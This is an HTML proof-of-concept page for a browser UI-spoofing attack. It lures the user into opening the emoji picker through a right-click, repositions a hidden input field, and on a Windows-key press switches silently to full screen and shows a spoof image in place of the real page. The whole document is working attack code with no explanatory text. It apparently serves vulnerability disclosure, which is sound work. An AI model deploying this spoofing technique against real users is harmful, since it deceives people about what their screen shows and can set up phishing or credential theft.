<!DOCTYPE html>
<html>
<head>
	<title>PoC</title>
	<style>
		body {
			margin: 0;
		}
		#spoof {
			width:  100%;
			height: 100%;
		}
		#input1 {
			position: absolute;
			left: 40%;
			width: 400px;
		}
		#input2 {
			position: absolute;
			left: 40%;
			width: 400px;
		}
	</style>
</head>
<body>
	<img id="spoof" src="https://lbherrera.github.io/lab/emoji-spoof/spoof.png" style="display: none;"></img>
	<div id="content">
		<center>
			<br>
			<h1>Right-click on the input field and select an emoji :)</h1>
			<input type="text" id="input1">
			<input type="text" id="input2">
		</center>
	</div>
	<script>
		let fullscreen = false;

		oncontextmenu = () => {
			setTimeout(() => {
				input2.style.top = "-25px";
			}, 0);
		}

		onkeydown = (event) => {
			let key = event.which || event.keyCode;
			if (key === 91 && !fullscreen) {
				setTimeout(() => {
					input2.style.width = "1px";
					document.getElementById("spoof").style.display = "block";
					document.getElementById("content").style.display = "none";
					document.documentElement.requestFullscreen();
				}, 0);
				fullscreen = true;
			}
		}
	</script>
</body>
</html>
